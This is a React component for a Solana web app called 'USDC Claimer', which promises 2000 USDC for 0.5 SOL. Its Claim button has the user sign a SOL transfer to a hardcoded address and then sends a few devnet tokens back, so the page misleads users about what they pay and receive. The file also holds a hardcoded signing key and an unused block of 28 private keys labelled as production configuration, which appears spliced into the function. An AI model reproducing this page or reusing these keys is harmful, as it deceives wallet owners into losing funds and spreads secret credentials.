/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "37CJsLFMkEYvhdjWpMeSJuvfAJnwLRo9aoTUQyatS3oPNdAT6e9KLqMvg5Q8tXYWHCai4tFJSEMkoDaQySA7bLW3"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "CwPpF3oK12w8z4gw3EkEmwfZYr7CDrFUxDP96i8KdsgkL3jjydZquKsemqdsDptQfFbpb2Qecnvp3S3MVzLUWk3",
  "key1": "5gVuus4bnB7PgsebqLc2JVCoHRyBmW1zZTKvc18EqC3xoEaHF8Gyag9oxeM6pEJYSWjUBB42TWUM1KHySbiCzZYR",
  "key2": "2jEKWPWVVtcwAPK4j4TUC8VbfeE2TifLjonxUMhsE9AUSknPgKXGTStPqnb4aw2XiXkxnBQCiEJTQrYTYkLxfzdA",
  "key3": "2FvNsoDbhdSMqLAiJbPgNf3vxAHM3p8DwoxS8tPJSbTnuLL3QPygwYiuVMVTLZpzZxPHAfAZGnQdDvanruETxYoA",
  "key4": "29gRk9Ghq15kYALfYWrJA3Be5o3u6FFpY61BXjDRYbfzVB6yLeJo6xctaouXiguKBWrWNHh1N7QHB4XyUK8XePz2",
  "key5": "4rJ16ks2Z6j9bs9MNtya3SeBewgti1euGWELdTPtpMNpzD3mH3DwgzxyHtFmVLgyuJLN1H8skd4bRyh4VxCXM5A7",
  "key6": "5xfbg4teH16h9poNA1W5pySQdWTmLdNCx7TLFPA4DZEYFVWxYM1a4QqqgUfPHcj4gSNcG8Sr7GiUkrDrjSiLkSrb",
  "key7": "6NiezZZPiEgApQ7zNYDTuyQAWZkxiUwFSgRQTde8D3AJ2rj3z1mRDMo61iC1r9b6Su7fGc1NVqPfTfDimFPwTWw",
  "key8": "37w83fcCDsRoFqY2hYhfFuhfetvi6scoemPTA9mnjBykJkKuRaYkjn1pwtcVCDkje4VWmGA8Bbr7wjASTDbTb7T2",
  "key9": "5hNxXbkLRQxC5oQFgiYkksG7kT6Uw2bNjvPu1e4CKYvfGyyNHhjqskVvTyYqiiYmTQbbELYQJX2NtT8rgz6vVhnk",
  "key10": "414qd9FNT7A49emWXmGieW7zdRMMddDxpfbnxWpqFVamNkbhvteaoex39A8N6HbDC2hz28eGQGujGuUVrgvg6FdB",
  "key11": "5zjBSasoQY4gKuQLMxCEYktKyP4maiYt5hRHnwGreAJJznL5S4rYmuTjqvMXRfkXeGJSKKtyZhGLnanDD5LCFzmF",
  "key12": "2348X69sKJk5RNQB6mqv9BN1kQo548kUpox4BNQewXxuKsVB3wv3xw1X5k657HFMzU4Z1142MFFNTKJpH2Y9XBFK",
  "key13": "4sQrfNFam4Csgyg47XyRauVQKKDGZ1ipubBtJZyk9SAK69Cu8zZv2FzXiQgX8ejtAkVa1NePT8sS4cBec3sGFRuK",
  "key14": "5HJjiSLJasDDipVWtWScmbzShZZJGNepS1AGVW8GAEFtpEMBj3e3L4KdzzDyZGKHU5ubGwzUH4D7gK4RXSS1bgFW",
  "key15": "25BySqdgt4zAsc1zJceutYb6g5drouxBA3EXwE1ttro2EZv5h8aFbdYfcZVe4k75xmHNbmhXZ1yFVs8LENfMPghp",
  "key16": "3bQ5x7vvXvSJVec2yAnK8wSeDdBEFMnyr2HcWPo8g26iwBSyRHUBW2H2wvtQ8B3BN6bvpeFqpxSSa8vTwKEPcLY2",
  "key17": "5rx87rhABZ6THpXy8qHVuKyDWcpJgQG48duYTbnE65VFvQQeYSeNxnk27VbuY2PPNaZDePuLuf4B6dtbyVdcwm8Z",
  "key18": "DVbmMcBqo7WrgXjf1vyytAMmChydhnSEcobfCaH6JfM63Qs2gdnqVoJB3rGSayPy36LNktqMQ3xD6UXgfPKo5bY",
  "key19": "4RECLY5c9v6fsQEqxzF9UVttDLo1EDpHYy2Pd1D1Poj3i1xAqvSfSSXBUUBYvSmbH1iZrapyZUJSufAm8JTWAqpY",
  "key20": "4Kxp3mXokK7U1tXFwcdLedLudYC5p8F8Ri6abVtxPjbRdnAZ2vRAXp5Mn1SoorKkLuRELQPKq84LM7BpraKF1odB",
  "key21": "3LMhvcsDzXeYv9uJ6yAKDEzARdKoEEXFuybswn8gqvyKoKctjug9GxXxNvBoZi2irmzZ1BdbHGg8rE6Eofduc1ba",
  "key22": "43haKqCpAMndZRyh1PCEebx3G7f4hmw3yiF8qDqNj92jFLimDZPbmyx3oJA5DYwzqZMo3ckS9DTZUZcENgDiiwp1",
  "key23": "2ZcDXxcdNC9wAabtwBkjWxYi7vWiirLHnPeGGpmKhPbf1kjznDmXK4Rd1neUK27dZFon5W7GBjV1YXohZRfVw3U",
  "key24": "LgiMFXDdYeh6pw3oTxoYtBbRs3mDba68WxoTZsd3BoJ3qZNqd4ykh9T2Vb27gv6mfzTUYJrwrPvCbKHxVXU51Xx",
  "key25": "39QrmRU8LboJSVYuikhTCpWajremK5fVNj6FeKa2C6FxYJJ3uh7m6ef6j4nvP3ng5kFEc5hFxf3ud6wT3nBdDqG9",
  "key26": "2DUSGc3ZQCff6v4MHBxAmJ98FR8rjTv7eDNvh9cuyS4anyTmupDz1VR3RuWAC3iEvWgWLDZmicvqzor7zzcsrZpb",
  "key27": "2qnySGn8mvp38cw3tTXqYPTUGSQDL6Jf6C8voBMBgaUVhkrbXmz7ptitov2DjMgNhP1XGN7jt3j19Ff5mdKXuAZq"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
